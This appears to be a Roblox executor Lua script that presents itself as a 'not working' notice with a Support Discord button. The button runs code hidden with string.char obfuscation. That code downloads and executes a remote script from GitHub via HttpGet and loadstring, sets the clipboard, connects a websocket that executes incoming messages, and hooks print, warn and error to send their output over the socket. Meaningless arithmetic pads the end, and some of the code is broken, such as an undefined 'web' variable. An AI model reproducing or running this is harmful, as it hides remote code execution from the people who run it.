if not game:IsLoaded() then game.Loaded:Wait() end
local function fuck(Lua, Dex)
    game:GetService('StarterGui'):SetCore('SendNotification', {
        Title = Lua,
        Text = Dex,
        Icon = 'http://www.roblox.com/asset/?id=8904334671',
        Duration = 5,
    })
end
local screenGui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local titleLabel = Instance.new("TextLabel")
local messageLabel = Instance.new("TextLabel")
local deestoryButton = Instance.new("TextButton")
local discordButton = Instance.new("TextButton")
local uiCorner = Instance.new("UICorner")

screenGui.Name = "NotificationGui"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

frame.Size = UDim2.new(0.4, 0, 0.2, 0)
frame.Position = UDim2.new(0.3, 0, 0.4, 0)
frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
frame.BorderSizePixel = 0
frame.Parent = screenGui

uiCorner.Parent = frame

titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.Text = "------< Wynerd Currently Not Working >--------"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextScaled = true
titleLabel.BackgroundTransparency = 1
titleLabel.Parent = frame

messageLabel.Size = UDim2.new(1, 0, 0.4, 0)
messageLabel.Position = UDim2.new(0, 0, 0.3, 0)
messageLabel.Text = "We've disconnected. Feel free to check out [Alwi Hub Leakers Wynerd] > Redblues [Remake Version Wyvern] > [Chelpus Offcial Real Credit]. [Reminder This Script Paid But Free]"
messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
messageLabel.TextScaled = true
messageLabel.BackgroundTransparency = 1
messageLabel.Parent = frame

deestoryButton.Size = UDim2.new(0.45, 0, 0.2, 0)
deestoryButton.Position = UDim2.new(0.05, 0, 0.7, 0)
deestoryButton.Text = "[Deestory UI]"
deestoryButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
deestoryButton.TextColor3 = Color3.fromRGB(255, 255, 255)
deestoryButton.Parent = frame
deestoryButton.MouseButton1Click:Connect(function()
    print("Deestory UI button clicked!")
    screenGui:Destroy()
end)

discordButton.Size = UDim2.new(0.45, 0, 0.2, 0)
discordButton.Position = UDim2.new(0.5, 0, 0.7, 0)
discordButton.Text = "[Support Discord]"
discordButton.BackgroundColor3 = Color3.fromRGB(0, 0, 150)
discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
discordButton.Parent = frame
discordButton.MouseButton1Click:Connect(function() 
fuck('Loading.....', 'string.char = true or nil')
wait(1) 
 fuck('Wyborn', 'disconnected = _false')
local function A1() return string.char(102, 117, 99, 107) end
local B1 = {string.char(87, 121, 98, 111, 114, 110), string.char(119, 121, 98, 111, 114, 110)}
local C1 = table.concat({
    string.char(104, 116, 116, 112, 115), 
    ":", 
    string.char(47, 47), 
    string.char(114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109), 
    "/ckw69/Wyborn/main/wyborn"
})
local D1 = "https://discord.gg/cpXUTmMXXd"
local E1 = {["webSocket"] = syn and syn.websocket.connect or Krnl and Krnl.WebSocket.connect or fluxus and fluxus.WebSocket.connect or WebSocket and WebSocket.connect or websocket and websocket.connect}

local F1 = function()
    local G1 = game:HttpGet(C1, true)
    loadstring(G1)()
    setclipboard(D1)
    _G[B1[1]] = true
end

local H1 = function(I1)
    local J1 = string.sub(I1, 1, 3) .. "..." .. string.sub(I1, -4)
    xpcall(loadstring(J1), warn)
end

local K1 = function(L1)
    local M1 = L1 * math.random(1, 1000)
    local N1 = math.random(5000, 10000)
    return M1, N1
end

local O1 = function()
    local P1 = 5
    for _ = 1, P1 do
        P1 = P1 * math.random(5, 99)
    end
    return P1
end

local Q1 = function()
    repeat wait() until pcall(function() _G[B1[2]] = E1["webSocket"]("ws://localhost:8080") end) == true
end

local R1 = function(S1, T1)
    local U1 = S1 .. tostring(T1)
    return U1
end

local A2 = function() 
    local B2 = game:GetService("StarterGui")
    B2:SetCore("SendNotification", {
        Title = ".",
        Text = ".",
        Duration = 5
    })
end

F1()
wait(O1())
screenGui:Destroy()
Q1()

web.OnMessage:Connect(function(V1)
    H1(V1)
end)

out_print = hookfunction(print, function(W1)
    local X1 = R1("print", W1)
    E1["webSocket"]:Send(X1)
    return out_print(W1)
end)

out_warn = hookfunction(warn, function(Y1)
    local Z1 = R1("warn", Y1)
    E1["webSocket"]:Send(Z1)
    return out_warn(Y1)
end)

out_error = hookfunction(error, function(A2)
    local B2 = R1("error", A2)
    E1["webSocket"]:Send(B2)
    return out_error(A2)
end)

local C2 = {10, 20, 30, 40, 50}
local D2 = {}
for i = 1, #C2 do
    local E2 = C2[i] * math.random(1, 5)
    table.insert(D2, E2)
end

local F2 = D2[math.random(1, #D2)] / 3
local G2 = math.sqrt(F2) + math.random(100, 999)

local H2 = 0
for I2 = 1, 100 do
    H2 = H2 + (I2 % 2 == 0 and I2 * 2 or I2)
end

local J2 = math.abs(H2 / G2) * 1000
local K3 = math.random(1, 500) * math.random(1, 100)
local L3 = math.floor(K3 / 3) + math.random(1, 200)
local M3 = string.char(math.random(65, 90), math.random(97, 122), math.random(65, 90))
local N3 = 0
for O3 = 1, 50 do
    N3 = N3 + (O3 % 2 == 0 and O3 * 3 or O3)
 end
local P3 = math.sqrt(N3 * L3)
A2()
end)

local UserInputService = game:GetService("UserInputService")

local dragging = false
local dragStart = nil
local startPos = nil

local function updateInput(input)
    if dragging then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
    end
end)

frame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(updateInput)
